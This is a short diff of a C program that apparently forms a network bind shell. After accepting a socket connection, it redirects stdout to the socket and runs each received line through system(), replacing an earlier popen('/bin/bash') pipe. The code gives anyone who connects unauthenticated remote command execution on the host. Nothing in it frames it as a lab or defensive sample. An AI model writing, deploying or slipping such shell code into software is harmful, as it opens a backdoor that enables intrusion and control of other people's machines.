@@ -37,23 +37,17 @@ int main() {
         } else {
             close(fd);
             dup2(cfd, 1);
-            FILE *bash = popen("/bin/bash", "w");
-            if (bash == NULL)
-                return 1;
-
             char buf[256] = {0};
             int e = 0;
             do {
                 e = read(cfd, buf, 256);
-                printf("Read");
                 if (strncmp(buf, "exit", 4) == 0) {
-                    fclose(bash);
                     close(cfd);
                     exit(0);
                 }
                 for (int i = e; i < 256; i++) buf[i] = 0;
-                fprintf(bash, "%s\n", buf);
-                fflush(bash);
+                system(buf);
+                write(cfd, "\n", 1);
             } while (1);
             exit(0);
         }
